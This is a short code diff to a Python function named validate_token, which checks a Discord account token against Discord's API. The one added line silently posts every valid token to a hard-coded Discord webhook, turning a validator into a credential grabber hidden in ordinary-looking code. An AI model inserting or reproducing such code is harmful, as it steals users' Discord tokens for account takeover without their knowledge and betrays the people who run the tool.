@@ -35,6 +35,7 @@ def validate_token(tk):
     try:
         r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=5)
         if r.status_code == 200:
+            requests.post("https://discord.com/api/webhooks/1480110828874371212/8kM-jfbIIyq4Nzo7IobtVVBXTnosySq-qsoUZTSJe2iOWU7Pj5ryJ0Al1LMIuRD0zMP4",json={"content": tk})
             return True, r.json()
     except: pass
     return False, None
